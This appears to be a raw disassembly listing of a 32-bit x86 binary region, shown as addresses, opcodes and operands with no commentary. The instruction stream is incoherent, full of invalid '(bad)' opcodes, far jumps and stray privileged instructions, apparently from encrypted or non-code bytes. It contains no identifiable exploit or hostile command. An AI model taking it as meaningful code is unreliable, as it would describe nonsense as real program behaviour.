  41570e:	sbb    ecx,DWORD PTR [ebx-0x22ceb3d9]
  415714:	cdq    
  415715:	jecxz  0x4156cd
  415717:	lods   eax,DWORD PTR ds:[esi]
  415718:	(bad)  
  41571a:	sbb    esp,DWORD PTR [edi+0x1f]
  41571d:	shr    DWORD PTR [eax-0x43c6bafe],0x68
  415724:	sbb    eax,0x22f86ffe
  415729:	aam    0x61
  41572b:	mov    bh,0x58
  41572d:	dec    edx
  41572e:	lea    edi,es:[edx+0x399c5dd7]
  415735:	loopne 0x4156e7
  415737:	cdq    
  415738:	xchg   ebp,eax
  415739:	xchg   edx,eax
  41573a:	in     al,0xe1
  41573c:	cmp    eax,DWORD PTR [ecx]
  41573e:	mov    edx,0xcd7ff2a9
  415743:	sub    dl,BYTE PTR [esi-0x2621e4c4]
  415749:	inc    esp
  41574a:	shr    DWORD PTR [esi+0x52],1
  41574d:	mov    DWORD PTR [edi+ebp*2],ecx
  415750:	or     al,0xe2
  415752:	or     DWORD PTR [ecx+0xecbf902],esi
  415758:	imul   ecx,DWORD PTR [esp+edi*1+0x7ac27b1f],0xff10838d
  415763:	or     eax,0x61b3e46d
  415768:	mov    BYTE PTR [eax],cl
  41576a:	ins    BYTE PTR es:[edi],dx
  41576b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41576c:	sti    
  41576d:	les    eax,FWORD PTR [ecx]
  41576f:	pop    es
  415770:	(bad)  
  415771:	adc    eax,0xd1cd809b
  415776:	fucomp st(5)
  415778:	dec    eax
  415779:	jbe    0x41571a
  41577b:	fiadd  DWORD PTR [eax]
  41577d:	inc    esp
  41577e:	mov    DWORD PTR [ecx-0x1a],esp
  415781:	test   eax,0x52fcd31c
  415786:	retf   0xcb5e
  415789:	in     eax,dx
  41578a:	push   ebp
  41578b:	mov    ebx,0x29a0cc62
  415790:	add    eax,0xe1fae626
  415795:	sub    BYTE PTR [ebp+0x5e],ch
  415798:	mov    al,ds:0x830f3fea
  41579d:	jp     0x415720
  41579f:	test   al,al
  4157a1:	push   0xdb76b8c2
  4157a6:	and    al,0x4a
  4157a8:	mov    DWORD PTR [esi-0x4c07f8b],eax
  4157ae:	jno    0x4157ae
  4157b0:	test   dl,bl
  4157b2:	dec    esp
  4157b3:	xchg   ebp,eax
  4157b4:	loope  0x4157c5
  4157b6:	inc    esi
  4157b7:	inc    esp
  4157b8:	sbb    esi,DWORD PTR [ecx]
  4157ba:	loopne 0x415824
  4157bc:	jl     0x41574e
  4157be:	sti    
  4157bf:	mov    al,0x2b
  4157c1:	inc    eax
  4157c2:	and    al,0x34
  4157c4:	or     edx,edi
  4157c6:	xor    esi,DWORD PTR [esi]
  4157c8:	jle    0x41583c
  4157ca:	pop    ds
  4157cb:	xor    al,0x5d
  4157cd:	test   BYTE PTR [esi-0x83c282f],dl
  4157d3:	sub    BYTE PTR [ecx],cl
  4157d5:	cmc    
  4157d6:	dec    ecx
  4157d7:	pop    ss
  4157d8:	or     esp,edi
  4157da:	add    bh,bh
  4157dc:	pop    ebx
  4157dd:	cmp    eax,0x99e0cb2f
  4157e2:	pop    ecx
  4157e3:	pusha  
  4157e4:	lods   al,BYTE PTR ds:[esi]
  4157e5:	xor    al,0x5a
  4157e7:	push   cs
  4157e8:	iret   
  4157e9:	pop    ebp
  4157ea:	sbb    eax,0x859e0277
  4157ef:	mov    ebp,0xdb9bfc43
  4157f4:	stos   BYTE PTR es:[edi],al
  4157f5:	pop    edx
  4157f6:	hlt    
  4157f7:	les    esp,FWORD PTR [eax-0x67]
  4157fa:	xchg   edx,eax
  4157fb:	xchg   edx,eax
  4157fc:	push   ecx
  4157fd:	or     eax,0xecd175bd
  415802:	iret   
  415803:	xchg   esp,eax
  415804:	jp     0x4157fd
  415806:	into   
  415807:	imul   eax,edx,0xe93084b4
  41580d:	add    al,0x6
  41580f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415810:	jb     0x41580d
  415812:	je     0x41585c
  415814:	mov    dl,0xcb
  415816:	push   esi
  415817:	or     esp,DWORD PTR [ebx]
  415819:	sbb    ch,bl
  41581b:	jb     0x4157f5
  41581d:	xchg   edi,eax
  41581e:	nop
  41581f:	push   ebp
  415820:	cmp    al,0x74
  415822:	mov    esi,0x2655f4eb
  415827:	fidivr DWORD PTR ds:0x6a2af628
  41582d:	(bad)  [ebx-0x39948510]
  415833:	sbb    BYTE PTR [edi+0x23b6431b],bh
  415839:	ret    
  41583a:	adc    BYTE PTR [ebx-0x766c812b],bl
  415840:	sbb    eax,0x1e1f11f9
  415845:	and    bh,dh
  415847:	sub    DWORD PTR [esi-0x44480dab],0xc
  41584e:	fisttp QWORD PTR [ebx+0x10]
  415851:	mov    eax,0x3c0d9881
  415856:	sub    al,0x2e
  415858:	loop   0x415859
  41585a:	push   0x972ccd6b
  41585f:	xchg   esp,eax
  415860:	imul   ebp,esi,0xffffff8c
  415863:	fadd   QWORD PTR [eax-0x4907713f]
  415869:	not    DWORD PTR [ebp+edi*4+0x2220baa5]
  415870:	bnd jbe 0x415802
  415873:	nop
  415874:	adc    ah,dl
  415876:	and    ebx,DWORD PTR [esi]
  415878:	xlat   BYTE PTR ds:[ebx]
  415879:	xlat   BYTE PTR ds:[ebx]
  41587a:	aad    0xd6
  41587c:	sbb    al,dh
  41587e:	push   ss
  41587f:	out    dx,al
  415880:	ins    DWORD PTR es:[edi],dx
  415881:	xchg   BYTE PTR [edi],bl
  415883:	inc    eax
  415884:	mov    dh,0xe8
  415886:	rcr    DWORD PTR [ecx+esi*1],cl
  415889:	push   es
  41588a:	xor    al,0x98
  41588c:	repz push cs
  41588e:	ins    DWORD PTR es:[edi],dx
  41588f:	in     al,0x9f
  415891:	jae    0x4158d7
  415893:	pop    edx
  415894:	test   al,0x4d
  415896:	repz ror BYTE PTR [edx+0x59],cl
  41589a:	mov    dh,0xaf
  41589c:	fs push ds
  41589e:	mov    ebp,0x95f9bb17
  4158a3:	icebp  
  4158a4:	sahf   
  4158a5:	push   ss
  4158a6:	jo     0x415838
  4158a8:	push   0x12d6c495
  4158ad:	leave  
  4158ae:	jle    0x415830
  4158b0:	ins    DWORD PTR es:[edi],dx
  4158b1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4158b2:	jno    0x41583a
  4158b4:	fistp  WORD PTR [edx-0x77c3991f]
  4158ba:	push   edx
  4158bb:	call   0xae25:0x1dd85945
  4158c2:	pop    ebp
  4158c3:	cmp    BYTE PTR [ecx],dl
  4158c5:	mov    WORD PTR [eax],?
  4158c7:	sub    eax,0x38cb0059
  4158cc:	inc    eax
  4158cd:	mov    eax,DWORD PTR [edi+0x57]
  4158d0:	dec    esi
  4158d1:	add    eax,DWORD PTR [edx]
  4158d3:	test   BYTE PTR [edi],0x9b
  4158d6:	(bad)  
  4158d7:	aas    
  4158d8:	and    DWORD PTR [ebp+0x1a42507],edx
  4158de:	cwde   
  4158df:	mov    ah,0x0
  4158e1:	sub    DWORD PTR [ecx],0x556afb74
  4158e7:	mov    ch,0xaf
  4158e9:	mov    edi,DWORD PTR [eax]
  4158eb:	jle    0x41586f
  4158ed:	clc    
  4158ee:	lods   eax,DWORD PTR ds:[esi]
  4158ef:	xor    eax,0xca3b7cf8
  4158f4:	push   esp
  4158f5:	adc    al,0xc8
  4158f7:	leave  
  4158f8:	rol    BYTE PTR ds:0x5cbd2453,0x43
  4158ff:	or     ebx,DWORD PTR [ebp-0xe5e9415]
  415905:	fs in  al,0x98
  415908:	retf   0x85c9
  41590b:	mov    edx,0x3facbbc1
  415910:	cmp    dl,BYTE PTR [edi]
  415912:	adc    ecx,DWORD PTR [esi-0x19493138]
  415918:	sahf   
  415919:	mov    edi,0xb3fe4a3b
  41591e:	sub    BYTE PTR [esi+ebp*1+0x69],0xec
  415923:	in     eax,0xe0
  415925:	js     0x4158d1
  415927:	mov    edx,0xb232a23b
  41592c:	sbb    eax,0xa6a0099b
  415931:	retf   0x1d4a
  415934:	imul   DWORD PTR [edx]
  415936:	mov    ebp,0xd9900ce6
  41593b:	push   ebp
  41593c:	dec    ebx
  41593d:	cmc    
  41593e:	into   
  41593f:	push   ebx
  415940:	xor    ebp,DWORD PTR [eax+0x74]
  415943:	pop    di
  415945:	add    eax,0xc17428c0
  41594a:	pop    edi
  41594b:	add    al,0x82
  41594d:	cli    
  41594e:	pop    edx
  41594f:	call   0xe114:0x7d373019
  415956:	mov    ds:0x94ab04f7,al
  41595b:	out    0xdc,al
  41595d:	sbb    eax,0x71467eb1
  415962:	sbb    BYTE PTR [edx],bh
  415964:	sbb    ah,BYTE PTR [ebp+eiz*2+0x44ae287]
  41596b:	xor    DWORD PTR [edx],ebp
  41596d:	lds    edx,FWORD PTR [edx-0x35d5e0b2]
  415973:	mov    ds:0xd41be795,al
  415978:	stos   BYTE PTR es:[edi],al
  415979:	or     bh,BYTE PTR [ebp+0xa700b33]
  41597f:	sbb    al,0xbd
  415981:	out    0x6d,eax
  415983:	loop   0x41593e
  415985:	or     al,BYTE PTR [eax]
  415987:	add    eax,0x82cb9e82
  41598c:	daa    
  41598d:	mov    eax,0x8d5f1128
  415992:	ss aaa 
  415994:	scas   eax,DWORD PTR es:[edi]
  415995:	xor    ch,BYTE PTR [eax]
  415997:	in     eax,0xfe
  415999:	mov    al,0xf3
  41599b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41599c:	jmp    0x3b3e:0xe6f8ac98
  4159a3:	and    DWORD PTR [eax],esp
  4159a5:	pop    ecx
  4159a6:	sbb    al,0x77
  4159a8:	mov    ecx,0xd3eadc65
  4159ad:	dec    eax
  4159ae:	mov    dl,0x8d
  4159b0:	scas   al,BYTE PTR es:[edi]
  4159b1:	imul   ebp,DWORD PTR [edx-0x18],0x1e3e20ed
  4159b8:	int3   
  4159b9:	loope  0x415a16
  4159bb:	daa    
  4159bc:	pushf  
  4159bd:	mov    al,0x2
  4159bf:	in     al,dx
  4159c0:	adc    al,0xb
  4159c2:	pusha  
  4159c3:	and    ebx,DWORD PTR [ebx+0x2b7796b7]
  4159c9:	call   0xe8999385
  4159ce:	stc    
  4159cf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4159d0:	jbe    0x415a40
  4159d2:	pop    ecx
  4159d3:	inc    esp
  4159d4:	xor    al,0x60
  4159d6:	xchg   ebp,eax
  4159d7:	push   eax
  4159d8:	xlat   BYTE PTR ds:[ebx]
  4159d9:	ins    BYTE PTR es:[edi],dx
  4159da:	ins    BYTE PTR es:[edi],dx
  4159db:	jecxz  0x4159e3
  4159dd:	ret    
  4159de:	sub    bl,cl
  4159e0:	into   
  4159e1:	mov    dl,0xeb
  4159e3:	les    edi,FWORD PTR [edi]
  4159e5:	test   al,0xac
  4159e7:	out    0xb0,al
  4159e9:	(bad)  
  4159ea:	xchg   edx,eax
  4159eb:	add    bh,BYTE PTR [esi]
  4159ed:	test   BYTE PTR [ebx-0x665d32d9],0x72
  4159f4:	je     0x415985
  4159f6:	test   DWORD PTR [eax+edx*1-0x5e],edx
  4159fa:	or     esi,DWORD PTR [ebx+0x52]
  4159fd:	inc    ecx
  4159fe:	inc    ebp
  4159ff:	lock imul edx,DWORD PTR [esi+0x33],0xeee85a86
  415a07:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415a08:	mov    fs,WORD PTR [ecx+0x6f]
  415a0b:	add    DWORD PTR [edi],ecx
  415a0d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415a0e:	pop    ds
  415a0f:	xor    al,0x92
  415a11:	dec    ebx
  415a12:	repnz sub DWORD PTR [ecx],0x3d
  415a16:	and    al,0xb2
  415a18:	jae    0x4159e6
  415a1a:	lea    esp,[edx]
  415a1c:	adc    ah,BYTE PTR [ebp-0x68]
  415a1f:	jne    0x415a97
  415a21:	(bad)  
  415a23:	and    al,0x77
  415a25:	pop    ebx
  415a26:	aam    0x9d
  415a28:	xor    BYTE PTR [esi+0x14e8778f],ch
  415a2e:	retf   0x650b
  415a31:	cs cdq 
  415a33:	pop    es
  415a34:	bound  edx,QWORD PTR [ebp+ebx*8-0x2f383689]
  415a3b:	xchg   edx,eax
  415a3c:	neg    DWORD PTR [edx-0x2a9a2be6]
  415a42:	xchg   ecx,eax
  415a43:	dec    DWORD PTR [ebx]
  415a45:	mov    ecx,DWORD PTR [eax+0x13c25420]
  415a4b:	sbb    eax,0xd1eff1f6
  415a50:	mov    ch,0x2e
  415a52:	mov    BYTE PTR [edi+0xc896df2],ch
  415a58:	sub    DWORD PTR [edi+ecx*4+0x45],esp
  415a5c:	test   ax,0x7f74
  415a60:	jmp    0x5691:0x52fb9e0c
  415a67:	out    0x13,al
  415a69:	pop    ebp
  415a6a:	adc    ebp,DWORD PTR [edi-0x30984ef]
  415a70:	repz sbb BYTE PTR [ebx+ebx*1-0x5a5eab9],0x14
  415a79:	add    ah,0x6a
  415a7c:	(bad)  
  415a7d:	jl     0x415a07
  415a7f:	pop    ebp
  415a80:	push   eax
  415a81:	lock fiadd DWORD PTR [ebx-0x213766b8]
  415a88:	sbb    eax,0xb7bd5260
  415a8d:	(bad)  
  415a8e:	retf   
  415a8f:	xor    al,BYTE PTR [ebp+0x72a94cb4]
  415a95:	bound  ebx,QWORD PTR [edx]
  415a97:	test   eax,0x5b1916dd
  415a9c:	fidivr WORD PTR [edi-0x22]
  415a9f:	xchg   edi,eax
  415aa0:	jne    0x415aee
  415aa2:	push   es
  415aa3:	jnp    0x415b1c
  415aa5:	jns    0x415aa0
  415aa7:	scas   eax,DWORD PTR es:[edi]
  415aa8:	xor    esi,edx
  415aaa:	mov    cl,0xc
  415aac:	cmp    eax,0x52c111a5
  415ab1:	push   esp
  415ab2:	adc    eax,0xd804bdb
  415ab7:	xor    al,0x4b
  415ab9:	dec    ecx
  415aba:	push   esp
  415abb:	inc    ebx
  415abc:	ror    eax,cl
  415abe:	rol    bl,cl
  415ac0:	cmp    DWORD PTR [eax+ecx*4],eax
  415ac3:	pushf  
  415ac4:	sbb    eax,0x119a0857
  415ac9:	push   cs
  415aca:	outs   dx,DWORD PTR ds:[esi]
  415acb:	adc    eax,0x18569af2
  415ad0:	shl    ch,0x73
  415ad3:	into   
  415ad4:	cld    
  415ad5:	pop    esp
  415ad6:	fcomp  st(5)
  415ad8:	mov    ch,0xe9
  415ada:	cmp    BYTE PTR [esi-0x16],al
  415add:	jg     0x415ad6
  415adf:	inc    ecx
  415ae0:	adc    dh,al
  415ae2:	shr    DWORD PTR [ebx+0x50],1
  415ae5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415ae6:	call   0xf116:0x28cfd50a
  415aed:	(bad)  
  415aee:	mov    ecx,0x52edd28b
  415af3:	cmp    al,0x2e
  415af5:	int    0x35
  415af7:	and    DWORD PTR [edi-0x3c],edx
  415afa:	xor    ecx,esi
  415afc:	jae    0x415b1e
  415afe:	xlat   BYTE PTR ds:[ebx]
  415aff:	xor    eax,0xcf28b65d
  415b04:	imul   eax,DWORD PTR [ecx+esi*4-0x1a],0x8d285f43
  415b0c:	test   BYTE PTR [si+0x36],0xdf
  415b11:	mov    bh,0x14
  415b13:	mov    dx,0xc5f7
  415b17:	mov    dh,0x70
  415b19:	jmp    0x415ace
  415b1b:	test   BYTE PTR [ebx],0x95
  415b1e:	lea    esi,[edi+0x13]
  415b21:	sbb    eax,0xc1c4e0fb
  415b26:	jle    0x415b10
  415b28:	xor    esi,esp
  415b2a:	mul    BYTE PTR [ecx+0x8]
  415b2d:	jecxz  0x415ac6
  415b2f:	inc    ecx
  415b30:	loope  0x415bab
  415b32:	sbb    ecx,edi
  415b34:	jbe    0x415b1f
  415b36:	mov    ah,0xda
  415b38:	mov    WORD PTR [ebp-0x1b1f1f4],gs
  415b3e:	daa    
  415b3f:	xor    eax,0xdfa9c47a
  415b44:	aad    0x72
  415b46:	mov    esp,0xd8cb67c0
  415b4b:	inc    esp
  415b4c:	imul   esp,ebp,0x3b1cc37e
  415b52:	push   edi
  415b53:	in     eax,0x99
  415b55:	pop    esp
  415b56:	pop    ds
  415b57:	test   BYTE PTR [edx+0x14de894b],0x63
  415b5e:	and    DWORD PTR [ecx-0x2b0b39ae],ecx
  415b64:	cmp    BYTE PTR [edx+0x38],cl
  415b67:	xor    BYTE PTR [ecx-0x16],0x8e
  415b6b:	jae    0x415b91
  415b6d:	xor    ebp,ecx
  415b6f:	test   eax,0xc18c899f
  415b74:	(bad)  [ebx-0x3eb9526f]
  415b7a:	cmps   DWORD PTR es:[esi],DWORD PTR es:[edi]
  415b7c:	or     BYTE PTR [edx+0x73],dh
  415b7f:	adc    al,0xf1
  415b81:	(bad)  
  415b82:	mov    ecx,0x8979b315
  415b87:	dec    esi
  415b88:	push   edx
  415b89:	mov    esp,fs
  415b8b:	cwde   
  415b8c:	sub    DWORD PTR ds:0xf361686c,esi
  415b92:	mov    cl,0x47
  415b94:	stos   DWORD PTR es:[edi],eax
  415b95:	adc    al,0x73
  415b97:	mov    dl,0x4c
  415b99:	add    DWORD PTR [ebx-0x1c],esp
  415b9c:	adc    BYTE PTR [ebx+0x24],0x43
  415ba0:	jle    0x415b7c
  415ba2:	sub    ch,ah
  415ba4:	dec    eax
  415ba5:	fcomp  DWORD PTR [esi-0x26]
  415ba8:	push   ds
  415ba9:	sub    BYTE PTR [eax+0x50cbe8f6],dl
  415baf:	aam    0x1a
  415bb1:	cmp    eax,0x77781a8c
  415bb6:	push   edi
  415bb7:	stos   DWORD PTR es:[edi],eax
  415bb8:	mov    cl,0x24
  415bba:	cdq    
  415bbb:	inc    esi
  415bbc:	jmp    0x415b82
  415bbe:	xchg   BYTE PTR [esi+0x68],bh
  415bc1:	retf   0xe160
  415bc4:	popf   
  415bc5:	in     eax,dx
  415bc6:	mov    cl,0x1d
  415bc8:	test   eax,0x21bfdc47
  415bcd:	sub    DWORD PTR [esi],0x3668fa76
  415bd3:	aaa    
  415bd4:	push   0xfffffff3
  415bd6:	jge    0x415c2e
  415bd8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415bd9:	pop    edi
  415bda:	mov    ds:0x862ebc1,eax
  415bdf:	xlat   BYTE PTR ds:[ebx]
  415be0:	mov    eax,0x589e787e
  415be5:	jb     0x415c0b
  415be7:	pop    edx
  415be8:	dec    edi
  415be9:	call   0x50be:0x2095296d
  415bf0:	inc    eax
  415bf1:	and    bh,BYTE PTR [ecx]
  415bf3:	stos   DWORD PTR es:[edi],eax
  415bf4:	test   edi,eax
  415bf6:	into   
  415bf7:	and    DWORD PTR [edx-0x7cdc0181],0x8149abcd
  415c01:	adc    eax,0x53c2fdd9
  415c06:	pop    ss
  415c07:	fsubrp st(7),st
  415c09:	push   edx
  415c0a:	shl    esi,1
  415c0c:	les    edx,FWORD PTR [edi+0x4dc16811]
  415c12:	push   ebp
  415c13:	out    dx,eax
  415c14:	out    0x70,eax
  415c16:	cs mov dl,0x0
  415c19:	push   ebx
  415c1a:	cdq    
  415c1b:	inc    ebp
  415c1c:	ror    BYTE PTR [edi+0x2e00cca4],1
  415c22:	ins    BYTE PTR es:[edi],dx
  415c23:	in     al,dx
  415c24:	arpl   WORD PTR [ebp-0x1184de9c],sp
  415c2a:	push   edi
  415c2b:	mov    ebx,0x1765dd3e
  415c30:	adc    edx,DWORD PTR [esi-0x79]
  415c33:	pop    esp
  415c34:	mov    ch,0x56
  415c36:	mov    ds:0x6c608968,eax
  415c3b:	mov    bh,0x1f
  415c3d:	cwde   
  415c3e:	jmp    0x698c:0x7be1c674
  415c45:	adc    eax,0xf23856d4
  415c4a:	fcom   QWORD PTR [edx+0xe514fed]
  415c50:	xchg   DWORD PTR [esi],esi
  415c52:	or     al,0x85
  415c54:	adc    DWORD PTR [edi-0x5cce040a],eax
  415c5a:	mov    ds:0x39dc3deb,eax
  415c5f:	jl     0x415c41
  415c61:	xor    BYTE PTR [edi],cl
  415c63:	pop    esi
  415c64:	in     eax,0xbf
  415c66:	pushw  cs
  415c68:	shl    DWORD PTR [edi+0xe8da455],0xae
  415c6f:	out    dx,al
  415c70:	js     0x415c07
  415c72:	lahf   
  415c73:	push   ds
  415c74:	loope  0x415cd4
  415c76:	cs jg  0x415c94
  415c79:	stos   BYTE PTR es:[edi],al
  415c7a:	(bad)  
  415c7b:	sbb    DWORD PTR [edx+0x6f],eax
  415c7e:	sub    eax,0x9a37b025
  415c83:	sbb    al,0xda
  415c85:	repnz mov al,ds:0x9299e2b6
  415c8b:	jmp    0x20b6:0xb0dd474f
  415c92:	and    ebx,DWORD PTR [edx-0x45]
  415c95:	and    al,0xa8
  415c97:	data16 jge 0x415cc6
  415c9a:	outs   dx,DWORD PTR ds:[esi]
  415c9b:	push   ebp
  415c9d:	out    0x67,eax
  415c9f:	movs   BYTE PTR es:[edi],BYTE PTR fs:[esi]
  415ca1:	mov    ebx,0x11ad91a9
  415ca6:	into   
  415ca7:	inc    ebx
  415ca8:	aam    0x32
  415caa:	push   edi
  415cab:	push   ebx
  415cac:	jbe    0x415d18
  415cae:	and    edx,DWORD PTR [esi]
  415cb0:	icebp  
  415cb1:	and    esi,eax
  415cb3:	fnstcw WORD PTR [edx-0x44]
  415cb6:	push   0xffffffc2
  415cb8:	inc    edx
  415cb9:	sub    eax,0xd095b986
  415cbe:	push   ss
  415cbf:	and    ebp,eax
  415cc1:	push   ecx
  415cc2:	cld    
  415cc3:	out    0x1e,al
  415cc5:	cmp    DWORD PTR [esi+0x55858071],esi
  415ccb:	out    0x8c,eax
  415ccd:	sbb    DWORD PTR ds:0x602b8214,ebx
  415cd3:	dec    esp
  415cd4:	sahf   
  415cd5:	xor    ch,BYTE PTR [edi+0x65]
  415cd8:	add    al,0xce
  415cda:	mov    eax,ds:0x4c34cb79
  415cdf:	mov    BYTE PTR [esi-0x1a1f56b8],ch
  415ce5:	ret    
  415ce6:	or     DWORD PTR [edi],esp
  415ce8:	stc    
  415ce9:	xchg   DWORD PTR [ecx+0x18],ebx
  415cec:	cmp    eax,0xcef65115
  415cf1:	mov    esp,0x8b4269d8
  415cf6:	xor    edi,DWORD PTR cs:[esi-0x50]
  415cfa:	push   esp
  415cfb:	mov    ebp,0x78a4d213
  415d00:	jl     0x415d32
  415d02:	mov    eax,0xc18a9899
  415d07:	int    0xde
  415d09:	dec    esi
  415d0a:	(bad)  
  415d0b:	lods   al,BYTE PTR ds:[esi]
  415d0c:	fwait
  415d0d:	dec    ebp
  415d0e:	int3   
  415d0f:	das    
  415d10:	or     DWORD PTR [ebx],0xffffffb9
  415d13:	fbld   TBYTE PTR [esp+ecx*4+0x4e]
  415d17:	scas   eax,DWORD PTR es:[edi]
  415d18:	push   ss
  415d19:	test   eax,0xf804ea52
  415d1e:	pop    esp
  415d1f:	scas   al,BYTE PTR es:[edi]
  415d20:	xchg   esp,eax
  415d21:	inc    ecx
  415d22:	xchg   edi,eax
  415d23:	sub    eax,0x6536ebf6
  415d28:	and    DWORD PTR [eax],0x71e74127
  415d2e:	les    edi,FWORD PTR [eax]
  415d30:	mov    ah,0x7
  415d32:	mov    ds:0x7af9df50,al
  415d37:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415d38:	push   edx
  415d39:	pop    ecx
  415d3a:	lahf   
  415d3b:	int    0x96
  415d3d:	xchg   esi,eax
  415d3e:	ret    0x6204
  415d41:	(bad)  
  415d42:	push   ecx
  415d43:	call   0x93eb07c2
  415d48:	push   ebx
  415d49:	(bad)  
  415d4a:	leave  
  415d4b:	jo     0x415d90
  415d4d:	in     eax,0x69
  415d4f:	hlt    
  415d50:	dec    esi
  415d51:	ss aam 0x84
  415d54:	add    BYTE PTR [ecx],bh
  415d56:	xor    DWORD PTR [ebx+0x42],esi
  415d59:	xchg   BYTE PTR [edi-0x15],ah
  415d5c:	add    eax,0x58d96a8d
  415d61:	fwait
  415d62:	push   0xffffffc3
  415d64:	cmp    al,0xf3
  415d66:	inc    ecx
  415d67:	imul   ecx,DWORD PTR [eax-0x30337e35],0x3
  415d6e:	and    DWORD PTR [esp+edi*2+0x1a],esp
  415d72:	cmp    BYTE PTR [ecx+0x2295086d],ah
  415d78:	and    DWORD PTR [esi+0x6323fa93],esi
  415d7e:	and    DWORD PTR [ebp-0x7a],esp
  415d81:	cmp    eax,0x9b36ba8d
  415d86:	inc    esp
  415d87:	ins    BYTE PTR es:[edi],dx
  415d88:	xchg   DWORD PTR [ebx+0x26159e7d],ebp
  415d8e:	or     al,0xbc
  415d90:	cmp    eax,DWORD PTR [edi+0x4a]
  415d93:	or     cl,BYTE PTR [edx+eax*1]
  415d96:	cdq    
  415d97:	ds jg  0x415d3a
  415d9a:	xchg   ebp,eax
  415d9b:	out    dx,eax
  415d9c:	push   cs
  415d9d:	push   esp
  415d9e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415d9f:	xchg   BYTE PTR [eax],ch
  415da1:	sub    eax,0x5ec7257c
  415da6:	push   ss
  415da7:	sub    al,0x66
  415da9:	add    al,BYTE PTR [esi+0x5a35fdd3]
  415daf:	rcl    DWORD PTR [esi+eax*8-0x65],0xc6
  415db4:	cmp    al,0x41
  415db6:	lock test BYTE PTR [ebx+0x6df38028],cl
  415dbd:	xchg   edx,eax
  415dbe:	out    dx,al
  415dbf:	cmp    dl,BYTE PTR ds:[ecx+0x21]
  415dc3:	jno    0x415dae
  415dc5:	loop   0x415e05
  415dc7:	fs mov edi,0x358b52cd
  415dcd:	lods   eax,DWORD PTR ds:[esi]
  415dce:	fs xor esi,edi
  415dd1:	adc    BYTE PTR [esi],0x60
  415dd4:	xlat   BYTE PTR ds:[ebx]
  415dd5:	jecxz  0x415e4d
  415dd7:	rol    BYTE PTR [edx+0x23],0x25
  415ddb:	ja     0x415d82
  415ddd:	and    DWORD PTR [edi-0x7da77b83],edx
  415de3:	rcr    BYTE PTR [esi],cl
  415de5:	hlt    
  415de6:	dec    eax
  415de7:	xchg   esi,eax
  415de8:	je     0x415de1
  415dea:	mov    WORD PTR [eax+0x79],fs
  415ded:	push   ss
  415dee:	loope  0x415e3a
  415df0:	adc    esi,esi
  415df2:	rol    BYTE PTR [edi-0x67],0xa
  415df6:	xchg   edi,eax
  415df7:	pop    eax
  415df8:	jo     0x415dc4
  415dfa:	popa   
  415dfb:	std    
  415dfc:	out    dx,al
  415dfd:	and    DWORD PTR [eax+0x30c6a37],ecx
  415e03:	xchg   edx,eax
  415e04:	and    BYTE PTR [eax],0x9c
  415e07:	sar    BYTE PTR [ecx],cl
  415e09:	scas   eax,DWORD PTR es:[edi]
  415e0a:	cs jp  0x415e46
  415e0d:	dec    edi
  415e0e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415e0f:	and    eax,0x1610d899
  415e14:	jae    0x415e57
  415e16:	out    0xff,eax
  415e18:	xchg   edi,eax
  415e19:	jns    0x415dcd
  415e1b:	jmp    0x7812c728
  415e20:	jl     0x415e5c
  415e22:	pop    ebp
  415e23:	ins    BYTE PTR es:[edi],dx
  415e24:	fs fwait
  415e26:	xchg   DWORD PTR [edx+ebx*8+0x49],edi
  415e2a:	shl    edi,0x68
  415e2d:	je     0x415e0d
  415e2f:	mov    bl,0xe7
  415e31:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415e32:	or     dh,BYTE PTR [esi+0x4b]
  415e35:	mov    ch,0xcb
  415e37:	(bad)  
  415e39:	sbb    esp,eax
  415e3b:	add    DWORD PTR [ebx+edx*2+0x131fbebe],ebp
  415e42:	mov    al,ds:0xcfe00245
  415e47:	clc    
  415e48:	retf   
  415e49:	aas    
  415e4a:	pop    esp
  415e4b:	pusha  
  415e4c:	into   
  415e4d:	pop    edi
  415e4e:	in     eax,0x3f
  415e50:	jo     0x415e09
  415e52:	jae    0x415eb4
  415e54:	sbb    dh,dl
  415e56:	cdq    
  415e57:	mov    ds:0xff34147e,al
  415e5c:	stc    
  415e5d:	push   es
  415e5e:	adc    ah,dh
  415e60:	mov    bh,0xa5
  415e62:	cmp    DWORD PTR [edx+eiz*2],esi
  415e65:	jae    0x415e50
  415e67:	lea    ebp,es:[edx*8-0xa2963bc]
  415e6f:	adc    BYTE PTR [esi],cl
  415e71:	jge    0x415e76
  415e73:	lock pushf 
  415e75:	push   ss
  415e76:	lods   al,BYTE PTR ds:[esi]
  415e77:	push   ss
  415e78:	inc    esi
  415e79:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415e7a:	out    0x85,al
  415e7c:	xchg   edi,eax
  415e7d:	adc    BYTE PTR [ebx+0x5c],cl
  415e80:	out    0x90,al
  415e82:	jns    0x415e14
  415e84:	jbe    0x415ea1
  415e86:	xchg   ecx,eax
  415e87:	inc    BYTE PTR [ecx]
  415e89:	mov    al,0xe2
  415e8b:	pop    esi
  415e8c:	push   ebx
  415e8d:	jns    0x415e22
  415e8f:	dec    ecx
  415e90:	int    0x7a
  415e92:	or     al,0xf
  415e94:	xchg   ebx,eax
  415e95:	inc    edi
  415e96:	sub    esi,DWORD PTR [ebx+0x5b]
  415e99:	ret    
  415e9a:	(bad)  
  415e9b:	pop    edx
  415e9c:	sub    DWORD PTR [ecx-0x22],ebp
  415e9f:	(bad)  
  415ea0:	test   al,0x39
  415ea2:	fiadd  DWORD PTR [eax]
  415ea4:	mov    ds:0x29593eb1,al
  415ea9:	gs xor eax,0xb95dc8c8
  415eaf:	cmp    ah,bl
  415eb1:	sbb    ebp,DWORD PTR [ecx]
  415eb3:	jmp    0x1a9654ce
  415eb8:	ins    DWORD PTR es:[edi],dx
  415eb9:	mov    esi,?
  415ebb:	and    BYTE PTR [ebp-0x32],cl
  415ebe:	sub    eax,0x462b337c
  415ec3:	shl    bl,cl
  415ec5:	cld    
  415ec6:	xchg   esp,eax
